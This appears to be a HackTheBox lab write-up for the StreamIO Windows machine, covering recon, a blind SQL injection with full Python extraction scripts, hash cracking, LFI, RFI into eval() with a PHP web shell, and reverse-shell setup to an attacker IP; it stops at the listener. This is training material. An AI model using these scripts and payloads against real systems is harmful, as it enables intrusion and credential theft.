---
title: "[EN] - HackTheBox: StreamIO Write-Up"
date: 2026-01-31 11:07:00 +0700
categories: [HackTheBox, Boxes, Medium, Windows]
tags: [SQL Injection, LFI, RFI, Eval injection, MSSQL, LAPS, ACLs abuse]
description: StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use WinPEAS to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the Core Staff group, then access LDAP to disclose the administrator LAPS password.
image: /assets/img/HTB-StreamIO_banner.png
---

## Enumeration

### Open TCP Ports

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ sudo nmap -sVC -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.69.73

Starting Nmap <REDACTED> ( https://nmap.org ) at 2026-01-31 15:29 CET
Nmap scan report for 10.129.69.73
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-31 21:29:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2026-01-31T21:31:19+00:00; +6h59m57s from scanner time.
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s
| smb2-time:
|   date: 2026-01-31T21:30:41
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.19 seconds
```

The service scan reveals a Windows Active Directory environment. Notably, the SSL certificate on port 443 exposes two **Subject Alternative Names** (``streamIO.htb`` and ``watch.streamIO.htb``) which are added to ``/etc/hosts`` along with the domain name picked up from LDAP (``streamIO.htb``).

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ echo "10.129.69.73 watch.streamio.htb streamio.htb" | sudo tee -a /etc/hosts
10.129.69.73 watch.streamio.htb streamio.htb
```

#### Port 53/tcp - DNS

Querying the DNS server for all records on the domain reveals additional hostnames, including ``dc.streamIO.htb`` and ``hostmaster.streamIO.htb``, both were also added to ``/etc/hosts``.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ dig ANY @10.129.69.73 streamio.htb

; <<>> DiG 9.18.44-1~deb12u1-Debian <<>> ANY @10.129.69.73 streamIO.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18363
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;streamIO.htb.                  IN      ANY

;; ANSWER SECTION:
streamIO.htb.           600     IN      A       10.129.69.73
streamIO.htb.           3600    IN      NS      dc.streamIO.htb.
streamIO.htb.           3600    IN      SOA     dc.streamIO.htb. hostmaster.streamIO.htb. 292 900 600 86400 3600
streamIO.htb.           600     IN      AAAA    dead:beef::58e0:e15a:f4a3:70f4

;; ADDITIONAL SECTION:
dc.streamIO.htb.        3600    IN      A       10.129.69.73
dc.streamIO.htb.        3600    IN      AAAA    dead:beef::58e0:e15a:f4a3:70f4

;; Query time: 43 msec
;; SERVER: 10.129.69.73#53(10.129.69.73) (TCP)
;; WHEN: Sat Jan 31 16:13:24 CET 2026
;; MSG SIZE  rcvd: 193
```

---

### Web Recon

From the Nmap output we know that there is 2 open web ports (`80/http` & `443/https`). 
The port `80/http` contain default IIS page and nothing more. However the port `443/https` host a movie streaming platform.

#### streamio.htb

![](/assets/img/HTB-StreamIO-streamio_index_page.png)

##### Technologies

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ whatweb https://streamIO.htb -a 3
https://streamIO.htb [200 OK] Bootstrap[4.3.1], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[oliver@Streamio.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.69.73], JQuery[3.4.1], Microsoft-IIS[10.0], PHP[7.2.26,], Script, Title[Streamio], X-Powered-By[PHP/7.2.26, ASP.NET], X-UA-Compatible[IE=edge]
```

- **Server**: ``Microsoft-IIS/10.0``
- **X-Powered-By**: ``PHP/7.2.26``, ``ASP.NET``
- **Email:** `oliver@Streamio.htb`

##### Site Features

- Contact Page at : `https://streamio.htb/contact.php`
- Login Page at : `https://streamio.htb/login.php`
- Register Page : `https://streamio.htb/register.php`

##### Directory Listing

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://streamio.htb/FUZZ -e .php

<SNIP>
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

            [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 48ms]
images             [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 41ms]
about.php   [ Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 44ms]
contact.php  [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 47ms]
index.php   [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 48ms]
login.php     [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 61ms]
register.php  [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 73ms]
admin             [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 108ms]
css               [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 41ms]
js                [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 78ms]
logout.php        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
fonts             [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 45ms]
			    [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 52ms]
:: Progress: [415260/415260] :: Job [1/1] :: 634 req/sec :: Duration: [0:10:10] :: Errors: 0 ::
```

Fuzzing `/admin` directory for PHP files : 

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ ffuf -ic -w `fzf-wordlists` -u https://streamIO.htb/admin/FUZZ -e .php

<SNIP>
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php          [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 59ms]
                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 44ms]
images             [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 47ms]
css                [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 52ms]
js                 [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 46ms]
master.php         [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 49ms]
fonts              [Status: 301, Size: 156, Words: 9, Lines: 2, Duration: 46ms]
                        [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 54ms]
:: Progress: [163260/163260] :: Job [1/1] :: 862 req/sec :: Duration: [0:04:00] :: Errors: 0 ::
```

When trying to access `master.php` we got : 

![](/assets/img/HTB-StreamIO-master.php.png)

---

#### watch.streamio.htb

![](/assets/img/HTB-StreamIO-watch_subscription_list.png)

##### Technologies

- **Server**: ``Microsoft-IIS/10.0``
- **X-Powered-By**: ``PHP/7.2.26``, ``ASP.NET``

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ whatweb https://watch.streamIO.htb -a 3
https://watch.streamIO.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.69.73], Microsoft-IIS[10.0], PHP[7.2.26,], Script, Title[Streamio], X-Powered-By[PHP/7.2.26, ASP.NET]
```

##### Site Features

- Updates on new movie arrivals : `https://watch.streamio.htb/index.php`

##### Directory Listing

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ ffuf -ic -w `fzf-wordlists` -u https://watch.streamIO.htb/FUZZ -e .php

<SNIP>
________________________________________________

 :: Method           : GET
 :: URL              : https://watch.streamIO.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 49ms]
	        [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 83ms]
search.php  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 274ms]
static      [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 50ms]
blocked.php [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 44ms]
            [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 43ms]
```

---

## Initial Access

### SQL injection in search.php

Browsing to ``https://watch.streamio.htb`` presents a movie search form.

![](/assets/img/HTB-StreamIO-watch_index_page.png)

While testing the form for SQL injection, it becomes apparent that the application is vulnerable to blind boolean-based SQLi. Sending a payload that evaluates to ``TRUE`` causes the application to return results for the movie ``1408``.

![](/assets/img/HTB-StreamIO-sqli_detection_true.png)

Flipping the payload to evaluate to ``FALSE`` returns no results at all, confirming the vulnerability.

![](/assets/img/HTB-StreamIO-sql_detection_false.png)

With the injection confirmed, the next logical step is to automate data extraction, ideally with SQLMap. 
However, further testing reveals that several common SQL keywords such as ``OR``, ``WAITFOR`` and ``ORDER`` are blocked by the application.

![](/assets/img/HTB-StreamIO-sqli_blocked_or_operator.png)

These restrictions are enough to break SQLMap's detection routines, so manual exploitation is necessary. Rather than extracting data by hand, a custom Python script is developed to do the heavy lifting. 
Before writing the exploit, the database engine needs to be identified.

![](/assets/img/HTB-StreamIO-sqli_injection_db_detection.png)

The payload confirms the target is running MSSQL. After testing a few functions, ``LEN()``, ``SUBSTRING()`` and ``ASCII()`` are all found to be allowed and will form the basis of the extraction logic.

#### Tables Extraction

A multithreaded Python script is built with claude around these three functions to enumerate all database tables.

```python
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
URL = "https://watch.streamio.htb/search.php"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
MAX_THREADS = 40

# Lock for thread-safe printing
print_lock = threading.Lock()

def test_payload(payload):
    """Test payload and returns True if data is returned"""
    data = {"q": payload}
    try:
        r = requests.post(URL, data=data, headers=HEADERS, verify=False, timeout=10)
        return '<h5 class="p-2">1408</h5>' in r.text
    except:
        return False

def find_length(query_template, max_length=100):
    """Find the length of a string"""
    for length in range(1, max_length + 1):
        if test_payload(query_template.format(length=length)):
            return length
    return 0

def extract_char_at_position(query_template, pos):
    """Extract a single character at a given position"""
    for ascii_val in range(32, 127):
        payload = query_template.format(pos=pos, ascii=ascii_val)
        if test_payload(payload):
            return (pos, chr(ascii_val))
    return (pos, "?")

def extract_string_threaded(query_template, length):
    """Extract a string with threading"""
    result = [''] * length

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(extract_char_at_position, query_template, pos): pos
                   for pos in range(1, length + 1)}

        for future in as_completed(futures):
            pos, char = future.result()
            result[pos - 1] = char

            with print_lock:
                current = ''.join(result)
                print(f"[+] Position {pos}/{length}: '{char}' -> {current}")

    return ''.join(result)

# Count tables
print("[*] Counting tables...")
for count in range(1, 50):
    if not test_payload(f"1408' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE')>{count}--"):
        nb_tables = count
        print(f"[+] Number of tables: {nb_tables}\n")
        break

# Extract all tables
tables = []

for i in range(nb_tables):
    print(f"[*] Extracting table {i+1}/{nb_tables}...")

    # Build NOT IN clause
    if tables:
        not_in = "'" + "','".join(tables) + "'"
        where_clause = f"AND table_name NOT IN ({not_in})"
    else:
        where_clause = ""

    # Find length
    length_query = f"1408' AND {{length}}=LEN((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_type='BASE TABLE' {where_clause}))--"
    table_length = find_length(length_query)

    if table_length > 0:
        # Extract name
        extract_query = f"1408' AND {{ascii}}=ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_type='BASE TABLE' {where_clause}),{{pos}},1))--"
        table_name = extract_string_threaded(extract_query, table_length)
        tables.append(table_name)
        print(f"[!] Table found: {table_name}\n")

# Summary
print("="*60)
print("ALL TABLES")
print("="*60)
for table in tables:
    print(f"  - {table}")
print("="*60)
```

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ python3 extract_tables.py
[*] Counting tables...
[+] Number of tables: 2

[*] Extracting table 1/2...
[+] Position 5/6: 'e' -> e
[+] Position 4/6: 'i' -> ie
[+] Position 1/6: 'm' -> mie
[+] Position 2/6: 'o' -> moie
[+] Position 6/6: 's' -> moies
[+] Position 3/6: 'v' -> movies
[!] Table found: movies

[*] Extracting table 2/2...
[+] Position 3/5: 'e' -> e
[+] Position 4/5: 'r' -> er
[+] Position 5/5: 's' -> ers
[+] Position 2/5: 's' -> sers
[+] Position 1/5: 'u' -> users
[!] Table found: users

============================================================
ALL TABLES
============================================================
  - movies
  - users
============================================================
```

The script identifies two tables (``movies`` & ``users``).

#### Columns extraction

With the table names in hand, a second script is written again with the claude to enumerate the columns and dump all rows from the ``users`` table.

```python
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
URL = "https://watch.streamio.htb/search.php"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
MAX_THREADS = 10

# Lock for thread-safe printing
print_lock = threading.Lock()

def test_payload(payload):
    """Test payload and return True if data is returned"""
    data = {"q": payload}
    try:
        r = requests.post(URL, data=data, headers=HEADERS, verify=False, timeout=10)
        return '<h5 class="p-2">1408</h5>' in r.text
    except:
        return False

def find_length(query_template, max_length=200):
    """Find the length of a string"""
    for length in range(1, max_length + 1):
        if test_payload(query_template.format(length=length)):
            return length
    return 0

def extract_char_at_position(query_template, pos):
    """Extract a single character at given position (for threading)"""
    for ascii_val in range(32, 127):
        if test_payload(query_template.format(pos=pos, ascii=ascii_val)):
            return (pos, chr(ascii_val))
    return (pos, "?")

def extract_string_threaded(query_template, length):
    """Extract a string with threading for speed"""
    result = [''] * length
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(extract_char_at_position, query_template, pos): pos 
                   for pos in range(1, length + 1)}
        
        for future in as_completed(futures):
            pos, char = future.result()
            result[pos - 1] = char
    
    return ''.join(result)

# ===== STEP 1: EXTRACT COLUMNS =====
print("\n[*] === EXTRACTING COLUMNS FROM TABLE 'users' ===")

# Count number of columns
count_query = "1408' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>{count}--"

for count in range(1, 50):
    if not test_payload(count_query.format(count=count)):
        nb_columns = count
        print(f"[+] Number of columns: {nb_columns}\n")
        break

# Extract each column name
columns = []
for i in range(nb_columns):
    not_in_clause = "'" + "','".join(columns) + "'" if columns else "''"
    
    print(f"[*] Extracting column {i+1}/{nb_columns}...")
    
    length_query = f"1408' AND {{length}}=LEN((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ({not_in_clause})))--"
    col_length = find_length(length_query)
    
    if col_length > 0:
        extract_query = f"1408' AND {{ascii}}=ASCII(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ({not_in_clause})),{{pos}},1))--"
        col_name = extract_string_threaded(extract_query, col_length)
        columns.append(col_name)
        print(f"[!] Column found: {col_name}\n")

print(f"[!] Extracted columns: {columns}\n")

# ===== STEP 2: COUNT ROWS =====
print("[*] === COUNTING ROWS ===")
for count in range(1, 100):
    if not test_payload(f"1408' AND (SELECT COUNT(*) FROM users)>{count}--"):
        nb_rows = count
        print(f"[+] Number of rows: {nb_rows}\n")
        break

# ===== STEP 3: EXTRACT DATA =====
users_data = []

# Identify ID column (first column or one containing 'id')
id_column = next((col for col in columns if 'id' in col.lower()), columns[0])
print(f"[*] Using '{id_column}' as primary key\n")

for row_index in range(nb_rows):
    print(f"[*] === EXTRACTING ROW {row_index + 1}/{nb_rows} ===")
    
    # Build WHERE clause to exclude already extracted rows
    if users_data:
        not_in_ids = "'" + "','".join([str(u[id_column]) for u in users_data]) + "'"
        where_clause = f"WHERE {id_column} NOT IN ({not_in_ids})"
    else:
        where_clause = ""
    
    row_data = {}
    
    # Extract each column
    for col in columns:
        print(f"[*] Extracting '{col}'...")
        
        # Find length
        length_query = f"1408' AND {{length}}=LEN((SELECT TOP 1 CAST({col} AS VARCHAR) FROM users {where_clause}))--"
        col_length = find_length(length_query)
        
        if col_length > 0:
            # Extract value
            extract_query = f"1408' AND {{ascii}}=ASCII(SUBSTRING((SELECT TOP 1 CAST({col} AS VARCHAR) FROM users {where_clause}),{{pos}},1))--"
            col_value = extract_string_threaded(extract_query, col_length)
            row_data[col] = col_value
            print(f"[!] {col}: {col_value}")
        else:
            row_data[col] = "NULL"
            print(f"[!] {col}: NULL")
    
    users_data.append(row_data)
    
    # Display row summary
    print(f"\n{'='*60}")
    print(f"Row {row_index + 1}:")
    for col, val in row_data.items():
        print(f"  {col}: {val}")
    print(f"{'='*60}\n")

# ===== FINAL SUMMARY =====
print("\n" + "="*80)
print("SUMMARY OF ALL EXTRACTED DATA")
print("="*80)

for i, row in enumerate(users_data, 1):
    print(f"\nRow {i}:")
    for col in columns:
        print(f"  {col}: {row.get(col, 'N/A')}")

print("\n" + "="*80)
```

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ python3 extract_datas.py | tee -a streamio_db.dump

<SNIP>

[*] === EXTRACTING ROW 1/30 ===
[*] Extracting 'id'...
[!] id: 3
[*] Extracting 'username'...
[!] username: James
[*] Extracting 'password'...
[!] password: c660XXXXXXXXXXXXXXXXXXXXc99c92
[*] Extracting 'is_staff'...
[!] is_staff: 1

============================================================
Row 1:
  id: 3
  username: James
  password: c660XXXXXXXXXXXXXXXXXXXXc99c92
  is_staff: 1
============================================================

<SNIP>

Row 29:
  id: 31
  username: yoshihide
  password: b779XXXXXXXXXXXXXXXXXXXXXf5f23
  is_staff: 1

Row 30:
  id: 33
  username: admin
  password: 665a50ac9eaa781e4f7f04199db97a
  is_staff: 0

================================================================================
```

The dump reveals four columns (``id``, ``username``, ``password`` & ``is_staff``) across 30 rows, and the passwords appear to be MD5 hashes. 
Usernames and hashes are extracted from the dump for offline cracking :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ cat streamio_db.dump | grep "username:" | grep -v '[!]' | sort -u | cut -d ':' -f2 | sed 's/ //' | awk '{print tolower($0)}' > db_users.txt

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ cat streamio_db.dump | grep "password:" | grep -v '[!]' | sort -u | cut -d ':' -f2 | sed 's/ //' > db_hashes.txt
```

Cracking MD5 hashes : 

```shell
B:\Tools\hashcat
λ .\hashcat.exe -a 0 -m 0 -O .\hashes\db_hashes.txt .\wordlists\rockyou.txt --show
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
3577c47eb1e12c8ba021611e1280753c:$monique$1991$
665a50ac9eaa781e4f7f04199db97a11:paddpadd
5f4dcc3b5aa765d61d8327deb882cf99:password
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
482c811da5d5b4bc6d497ffa98491e38:password123
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
b779XXXXXXXXXXXXXXXXXXXXXf5f23:66bXXXXXXXXXXX..
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

To avoid testing credentials against the web application blindly, Kerbrute is used to validate which of the extracted usernames exist in the Active Directory domain.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ kerbrute userenum -d 'streamio.htb' --dc 10.129.69.73 'db_users.txt'

<SNIP>

Version: <REDACTED> - 01/31/26 - Ronnie Flathers @ropnop

2026/01/31 22:28:23 >  Using KDC(s):
2026/01/31 22:28:23 >   10.129.69.73:88

2026/01/31 22:28:23 >  [+] VALID USERNAME:       yoshihide@streamio.htb
2026/01/31 22:28:23 >  Done! Tested 30 usernames (1 valid) in 0.320 seconds 
```

Only ``yoshihide`` comes back as a valid domain user, worth noting for later.

### Admin Panel Authentication

With the users table dumped and the hashes cracked, the staff accounts can be tested against the ``streamio.htb`` login page. Authenticating as ``yoshihide:66bXXXXXXXXXXX..`` succeeds.

![](/assets/img/HTB-StreamIO-admin_panel_auth.png)

With a valid session, the ``/admin`` directory discovered during recon is now accessible.

![](/assets/img/HTB-StreamIO-admin_panel_index_page.png)

#### RFI Exploitation in Admin Panel

Navigating through the admin panel reveals that page content is loaded via URL parameter. For example, clicking on "**User Management**" changes the URL to ``https://streamio.htb/admin/?user=``.

![](/assets/img/HTB-StreamIO-admin_panel_users_management.png)

Attempting to abuse the four visible parameters (``user``, ``staff``, ``movie`` and admin message one) for Local and Remote File Inclusion yields no results.

![](/assets/img/HTB-StreamIO-admin_panel_failed_lfi.png)

This is where we decided to fuzz for hidden parameters and found a fifth one (``debug``).

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://streamio.htb/admin/index.php?FUZZ=" -b "PHPSESSID=e76t0v27ru5b0g9efipbuko5ja" -f
s 1678

<SNIP>
________________________________________________

debug              [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 58ms]
movie      [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 81ms]
staff          [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 61ms]
user              [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 56ms]
:: Progress: [6453/6453] :: Job [1/1] :: 649 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

The ``debug`` parameter is vulnerable to LFI, making it possible to read arbitrary files from the server.

![](/assets/img/HTB-StreamIO-admin_panel_successful_lfi.png)

Since the application is running PHP, we used a PHP base64 wrappers to leak pages source code.

![](/assets/img/HTB-StreamIO-admin_panel_php_wrappers_test.png)

Leaking the source of ``master.php``, the file identified earlier during directory enumeration, reveals a dangerous ``eval()`` function.

![](/assets/img/HTB-StreamIO-lfi_reading_master_file.png)


```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyY<SNIP>" | base64 -d

<SNIP>

<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

The decoded source shows that ``master.php`` reads and ``eval()``'s a file passed through a hidden ``include`` POST parameter, with no sanitisation, as long as the value is not ``index.php``. 
Accessing ``master.php`` directly still returns the rejection message, but since the debug parameter can include arbitrary files, it can be used to load ``master.php`` through the LFI, which satisfies the ``defined('included')`` check and unlocks the vulnerable code path.

![](/assets/img/HTB-StreamIO-master_access_denied.png)

Including ``master.php`` via ``debug=`` removes the restriction as we can see below :

![](/assets/img/HTB-StreamIO-admin_panel-master_inclusion.png)

With the ``eval()`` function reachable, we performed a Remote File Inclusion (RFI) by creating a minimal PHP web shell, hosted the file on our attacking machine and fetch ``shell.txt`` through the ``include`` parameter.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ cat shell.txt
system($_GET['c']);

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

![](/assets/img/HTB-StreamIO-admin_panel_eval_code_exec.png)

As we can see above, the server successfully fetches and executes the PHP code from our machine, confirming remote code execution.

#### Getting our Reverse Shell

For the reverse shell we used [ConPtyShell](https://raw.githubusercontent.com/antonioCoco/ConPtyShell) instead of a standard powershell payloads or the Nishang scripts, as it allocates a proper Windows pseudo console, providing a fully interactive terminal with features like tab completion.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1 && mv Invoke-ConPtyShell.ps1 shell.ps1

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ tail -f shell.ps1
class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
    }
}

"@;
Invoke-ConPtyShell <redacted_attacker_ip> 9001
```

After appending ``Invoke-ConPtyShell <attacker_ip> 9001`` at the end of `shell.ps1` and setting up a netcat listener, we executed the `powershell.exe -Command <command>` trough the `c=` parameter.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ stty raw -echo; (stty size; cat) | ncat -lvnp 9001
Ncat: Version <REDACTED> ( https://nmap.org/ncat )
                        Ncat: Listening on [::]:9001
